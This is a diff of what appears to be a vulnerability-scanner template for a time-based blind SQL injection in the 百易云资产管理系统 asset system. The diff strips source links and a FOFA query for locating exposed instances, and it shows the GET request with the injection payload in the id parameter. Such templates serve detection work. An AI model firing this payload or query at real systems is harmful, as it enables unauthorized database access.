@@ -3,14 +3,8 @@ info:
   name: 百易云资产管理系统 admin.ima.detail.php 存在SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gn89merch3xg52p2
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gn89merch3xg52p2
-    fofa: body="media/css/uniform.default.css" && body="资管云"||body="不要着急，点此"||title="资管云"
 http:
 - raw:
   - 'GET /wuser/admin.ima.detail.php?id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(0)))OKTO) HTTP/1.1
